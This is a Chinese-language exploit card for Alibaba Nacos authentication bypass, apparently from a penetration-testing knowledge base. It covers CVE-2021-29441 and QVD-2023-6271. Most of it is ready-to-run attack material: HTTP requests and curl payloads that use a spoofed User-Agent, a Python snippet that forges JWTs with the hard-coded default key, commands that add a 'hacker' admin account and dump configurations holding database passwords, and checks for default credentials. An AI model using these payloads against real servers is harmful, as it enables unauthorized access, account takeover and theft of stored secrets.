---
id: NACOS-AUTH-BYPASS
title: Nacos 认证绕过漏洞
product: nacos
vendor: Alibaba
version_affected: "< 2.2.1, < 1.4.6"
severity: CRITICAL
tags: [auth_bypass, 国产, 中间件, 微服务, 无需认证]
fingerprint: ["Nacos", "nacos", "/nacos/", "/v1/auth/", "/v1/cs/configs", "console-ui"]
---

## 漏洞描述

Alibaba Nacos 注册配置中心存在多个认证绕过漏洞，可未授权访问配置信息、创建用户、获取敏感数据。

## 影响版本

- Nacos < 2.2.1（默认JWT密钥）
- Nacos < 1.4.6（User-Agent绕过）
- Nacos 全版本（默认凭据 nacos/nacos）

## 前置条件

- 目标开放 8848 端口，运行 Nacos 服务
- 无需认证凭据

## 利用步骤

### CVE-2021-29441: User-Agent 绕过认证

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

### 添加管理员账号

```http
POST /nacos/v1/auth/users HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username=hacker&password=hacker123
```

### QVD-2023-6271: Token 伪造 (默认密钥)

Nacos < 2.2.1 使用默认 JWT 密钥 `SecretKey012345678901234567890123456789012345678901234567890123456789`

```python
import jwt
token = jwt.encode({"sub": "nacos", "exp": 9999999999}, "SecretKey012345678901234567890123456789012345678901234567890123456789", algorithm="HS256")
```

```http
GET /nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100 HTTP/1.1
Host: target:8848
Authorization: Bearer <forged_token>
```

### 读取所有配置（泄露数据库密码等）

```bash
curl "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100&search=accurate" \
  -H "User-Agent: Nacos-Server"
```

### 默认凭据

- `nacos` / `nacos`

## Payload

```bash
# CVE-2021-29441: User-Agent绕过列出用户
curl -s "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
  -H "User-Agent: Nacos-Server"

# 添加管理员账号
curl -X POST "http://target:8848/nacos/v1/auth/users" \
  -H "User-Agent: Nacos-Server" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=hacker123"

# QVD-2023-6271: 使用默认密钥伪造Token读取配置
TOKEN=$(python3 -c "import jwt; print(jwt.encode({'sub':'nacos','exp':9999999999}, 'SecretKey012345678901234567890123456789012345678901234567890123456789', algorithm='HS256'))")
curl -s "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100&search=accurate" \
  -H "Authorization: Bearer $TOKEN"
```

## 验证方法

```bash
# 验证User-Agent绕过是否有效
curl -s -o /dev/null -w "%{http_code}" \
  "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
  -H "User-Agent: Nacos-Server"
# 返回200表示绕过成功，403表示已修复

# 验证默认凭据
curl -s -o /dev/null -w "%{http_code}" \
  "http://target:8848/nacos/v1/auth/login" \
  -X POST -d "username=nacos&password=nacos"
# 返回200并包含accessToken表示默认凭据有效

# 验证默认JWT密钥
curl -s -o /dev/null -w "%{http_code}" \
  "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=1&search=accurate" \
  -H "Authorization: Bearer $TOKEN"
# 返回200表示默认密钥未更换
```

## 指纹确认

```bash
curl -s http://target:8848/nacos/
curl -s http://target:8848/nacos/v1/console/server/state
```
